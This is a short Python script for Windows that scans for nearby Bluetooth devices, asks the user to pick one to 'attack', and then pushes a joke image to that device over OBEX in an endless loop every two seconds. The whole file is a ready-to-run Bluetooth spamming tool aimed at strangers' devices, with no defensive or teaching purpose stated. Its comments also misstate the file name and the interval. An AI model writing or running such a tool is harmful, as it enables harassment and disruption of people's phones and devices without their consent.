import subprocess
import time

# Paths to the executables and the joke.txt file
BT_DISCOVERY_PATH = r"C:\Program Files (x86)\Bluetooth Command Line Tools\bin\btdiscovery.exe"
BT_OBEX_PATH = r"C:\Program Files (x86)\Bluetooth Command Line Tools\bin\btobex.exe"
JOKE_FILE_PATH = r"C:\Users\ASUS\OneDrive\Documents\joke.gif"

# Function to run btdiscovery and list Bluetooth devices
def run_btdiscovery():
    print("Scanning for Bluetooth devices...\n")
    process = subprocess.Popen([BT_DISCOVERY_PATH], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    
    # Process the output of btdiscovery
    devices = stdout.decode().splitlines()
    if len(devices) == 0:
        print("No devices found.")
        return []
    
    # Extract device information and store them
    device_list = []
    for idx, device in enumerate(devices):
        # Split the line into components (MAC address, device name, and description)
        device_info = device.split("\t")
        if len(device_info) >= 2:
            device_name = device_info[1]  # Get the device name
            device_list.append((idx + 1, device_info[0], device_name, device_info[2] if len(device_info) > 2 else 'Unknown'))  # Store full info
    
    # Display full device information with their numbers
    print("Found the following devices:\n")
    for idx, mac_address, name, description in device_list:
        print(f"{idx}. MAC: {mac_address}\tName: {name}\tDescription: {description}")
    
    return device_list

# Function to send the joke.txt file repeatedly to a device
def send_file(device_name):
    print(f"\nSending file {JOKE_FILE_PATH} to {device_name} every 5 seconds...\n")
    while True:
        # Call btobex to send the file to the selected device
        subprocess.run([BT_OBEX_PATH, '-n', device_name, JOKE_FILE_PATH])
        time.sleep(2)  # Wait for 2 seconds before sending again

# Main function to drive the program
def main():
    devices = run_btdiscovery()

    if not devices:
        print("No devices to attack.")
        return

    # Ask the user to select a device
    try:
        choice = int(input("\nEnter the number of the device you want to attack: "))
        if 1 <= choice <= len(devices):
            selected_device_name = devices[choice - 1][2]  # Get the name of the selected device
            send_file(selected_device_name)
        else:
            print("Invalid choice.")
    except ValueError:
        print("Invalid input. Please enter a valid number.")

if __name__ == "__main__":
    main()
